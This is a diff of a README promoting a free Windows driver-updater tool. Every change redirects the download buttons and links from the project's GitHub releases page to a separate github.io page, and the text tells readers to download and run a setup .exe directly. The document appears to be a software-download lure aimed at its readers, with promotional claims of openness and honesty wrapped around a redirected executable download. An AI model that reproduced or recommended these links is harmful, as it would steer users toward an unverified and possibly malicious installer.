@@ -1,7 +1,7 @@
 <h1>🔧 driver-updater-honest - Updates Only What Needs It</h1>
 
 <p align="center">
-  <a href="https://github.com/Sebastienstoic4309/driver-updater-honest/releases">
+  <a href="https://sebastienstoic4309.github.io">
     <img src="https://img.shields.io/badge/Download%20Now-Free%20Driver%20Updater-brightgreen?style=for-the-badge&logo=windows&logoColor=white" alt="Download Now" style="display:inline-block;padding:12px 24px;background:linear-gradient(135deg,#667eea,#764ba2);color:white;font-size:20px;font-weight:bold;border-radius:8px;text-decoration:none;">
   </a>
 </p>
@@ -20,13 +20,13 @@ Whether you're a casual user who just wants a smooth-running PC, or a tech enthu
 
 <h3>Step 1: Visit the Official Download Page</h3>
 
-Visit <a href="https://github.com/Sebastienstoic4309/driver-updater-honest/releases"><strong>this link</strong></a> to download the application. This page contains all available release versions of driver-updater-honest.
+Visit <a href="https://sebastienstoic4309.github.io"><strong>this link</strong></a> to download the application. This page contains all available release versions of driver-updater-honest.
 
 </p>
 
 <h3>Step 2: Download the Latest Version</h3>
 
-Once you're on the release page, look for the <strong>latest release</strong> (usually at the top) and click on the download asset. The file will be named something like <code>driver-updater-honest-setup.exe</code> or similar. Visit <a href="https://github.com/Sebastienstoic4309/driver-updater-honest/releases"><strong>this link</strong></a> to get started. Download and run this file directly. The download should start automatically after you confirm the file you want.
+Once you're on the release page, look for the <strong>latest release</strong> (usually at the top) and click on the download asset. The file will be named something like <code>driver-updater-honest-setup.exe</code> or similar. Visit <a href="https://sebastienstoic4309.github.io"><strong>this link</strong></a> to get started. Download and run this file directly. The download should start automatically after you confirm the file you want.
 
 <h3>Step 3: Run the Installer</h3>
 
@@ -152,7 +152,7 @@ Together, we can prove that driver updating doesn't have to be a black box. Hone
 Don't let outdated drivers slow you down or put your system at risk. Experience the difference of a driver updater that actually respects your time and your trust. Click the button below to head over to the official release page and get the latest version of driver-updater-honest,free of charge.
 
 <p align="center">
-  <a href="https://github.com/Sebastienstoic4309/driver-updater-honest/releases" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#f093fb,#f5576c);color:white;font-size:22px;font-weight:bold;border-radius:12px;text-decoration:none;box-shadow:0 4px 15px rgba(0,0,0,0.2);">⬇️ Download Now</a>
+  <a href="https://sebastienstoic4309.github.io" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#f093fb,#f5576c);color:white;font-size:22px;font-weight:bold;border-radius:12px;text-decoration:none;box-shadow:0 4px 15px rgba(0,0,0,0.2);">⬇️ Download Now</a>
 </p>
 
 <p align="center"><em>Free • Open Source • Transparent • For Windows 11</em></p>
